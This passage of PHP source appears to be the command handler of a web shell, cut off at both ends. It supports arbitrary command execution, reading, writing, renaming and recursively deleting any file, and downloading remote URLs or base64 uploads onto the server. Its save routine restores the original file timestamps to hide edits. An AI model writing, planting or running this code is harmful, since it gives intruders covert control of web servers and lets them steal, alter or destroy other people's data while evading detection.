            }
            usort($d_l, function($a, $b) { return strcasecmp($a['n'], $b['n']); });
            usort($f_l, function($a, $b) { return strcasecmp($a['n'], $b['n']); });
            $r = ['p' => $dir, 'i' => array_merge($d_l, $f_l)];
            break;
        case 'rename':
            $old_p = $req['fp'];
            if (!file_exists($old_p)) { $r = "ERR: Not found"; break; }
            $new_p = dirname($old_p) . '/' . $req['new_n'];
            $r = @rename($old_p, $new_p) ? "RENAMED" : "ERR: " . (!is_writable(dirname($old_p)) ? "Permission denied" : "Rename failed");
            break;
        case 'cmd': $r = xc($req['c'], $p); break;
        case 'read':
            if (!file_exists($req['fp'])) { $r = "ERR: File not found"; break; }
            $r = @file_get_contents($req['fp']);
            if ($r === false) $r = "ERR: " . (!is_readable($req['fp']) ? "Permission denied" : "Read failed");
            break;
        case 'save':
            $fp = $req['fp'];
            $mt = file_exists($fp) ? @filemtime($fp) : false;
            $at = file_exists($fp) ? @fileatime($fp) : false;
            $ok = @file_put_contents($fp, $req['c']) !== false;
            if ($ok && $mt !== false) @touch($fp, $mt, $at !== false ? $at : $mt);
            $r = $ok ? "SUCCESS" : "ERR: " . (!is_writable(dirname($fp)) ? "Directory not writable" : "Write failed");
            break;
        case 'rm':
            $fp = $req['fp'];
            if (!file_exists($fp)) { $r = "ERR: Not found"; break; }
            if (is_dir($fp)) {
                $it = new RecursiveDirectoryIterator($fp, FilesystemIterator::SKIP_DOTS);
                $ri = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                foreach ($ri as $o) $o->isDir() ? @rmdir($o->getPathname()) : @unlink($o->getPathname());
                $r = @rmdir($fp) ? "DELETED" : "ERR: " . (!is_writable(dirname($fp)) ? "Permission denied" : "Directory not empty or locked");
            } else {
                $r = @unlink($fp) ? "DELETED" : "ERR: Permission denied";
            }
            break;
        case 'mkdir':
            $target = $p.'/'.$req['n'];
            $r = @mkdir($target, 0755, true) ? "DIR_CREATED" : "ERR: " . (!is_writable($p) ? "Permission denied" : "Create failed");
            break;
        case 'mkfile':
            $target = $p.'/'.$req['n'];
            $r = @file_put_contents($target, "") !== false ? "FILE_CREATED" : "ERR: " . (!is_writable($p) ? "Permission denied" : "Create failed");
            break;
        case 'fetch':
            $data = @file_get_contents($req['url']);
            if ($data === false) { $r = "ERR: Remote fetch failed (allow_url_fopen may be off)"; break; }
            $r = @file_put_contents($p.'/'.$req['fn'], $data) !== false ? "FETCH_SUCCESS" : "ERR: " . (!is_writable($p) ? "Directory not writable" : "Save failed");
            break;
        case 'upload':
            $r = @file_put_contents($p.'/'.$req['fn'], base64_decode($req['bc'])) !== false ? "UPLOADED" : "ERR: " . (!is_writable($p) ? "Permission denied" : "Upload failed");
            break;
        case 'copy':
            $src = $req['fp'];
            if (!file_exists($src)) { $r = "ERR: Source not found"; break; }
            $dst = $req['dst'] . '/' . basename($src);
